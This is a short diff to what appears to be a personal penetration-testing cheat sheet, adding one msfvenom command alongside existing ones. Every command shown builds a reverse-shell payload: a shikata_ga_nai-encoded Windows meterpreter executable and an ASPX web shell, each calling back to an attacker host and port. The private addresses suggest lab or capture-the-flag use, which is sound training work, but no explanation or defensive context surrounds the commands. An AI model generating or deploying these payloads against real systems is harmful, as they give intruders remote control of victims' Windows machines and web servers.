@@ -1,5 +1,6 @@
 # Create Windows EXE meterpreter reverse shell
 msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=<attacker_host> LPORT=4444 -f exe -o rshell.exe
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.10.16.72 LPORT=4421 -f exe -o rshell.exe
 
 # Create Windows ASPX reverse shell
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.9.10.57 LPORT=4443 -f aspx -o rsh.aspx
